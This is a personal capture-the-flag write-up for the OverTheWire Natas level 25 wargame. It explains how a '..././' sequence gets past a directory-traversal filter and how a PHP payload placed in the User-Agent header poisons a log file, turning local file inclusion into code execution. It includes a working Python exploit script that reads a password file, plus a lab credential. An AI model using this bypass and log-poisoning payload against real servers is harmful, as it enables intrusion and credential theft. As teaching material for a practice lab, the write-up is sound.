
2024-07-25 18:59

Source: #web #py #natas 

Tags: [[LFI]]
### Natas25

- we have a page with some quote written on it and a language dropdown with `de` and `en` as 2 options 
- a function is called that sets the language - in that function a `safeinclude` named function is called that takes a filename as input and checks for directory traversal
- The `safeinclude` function replaces instances of `../` with empty strings and generates a log file in a specified path which is vulnerable 
- the `safeinclude` function also checks if "natas_webpass" is in the filename, 

Try directory traversal in a way like - `..././` so even if `../` is replaced with `""`  the remaining still equals  `../`
we can use this technique to get access to everything in the file system **including the log files** 

because we can control what this HTTP user agent is (that is input for us) we can modify that HTTP header so because we're including this file and because it's being spat out from the web server, that is looking at PHP code normally right we've got notices and warnings and all these other issues that are coming through what if we put PHP code as our user agent 

we'll be able to read it because we can specify we want our user agent to be the string which will get injected into that log entry and will be able to read because of local file inclusion and then it'll evaluate that PHP and give us remote code execution( [[RCE]]) with this .

```
import requests
username = 'natas25'
password = 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws'

url = 'http://natas25.natas.labs.overthewire.org/'
session = requests.Session()

headers = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26');?>"}

response = session.get(url,auth=(username,password))

response = session.post(url,headers=headers,data={"lang": "..././..././..././..././..././/var/www/natas/natas25/logs/natas25_"+session.cookies['PHPSESSID']+".log"},auth=(username,password))

print(response.text)
```

### References
https://www.youtube.com/watch?v=K1rBD0lJ0o8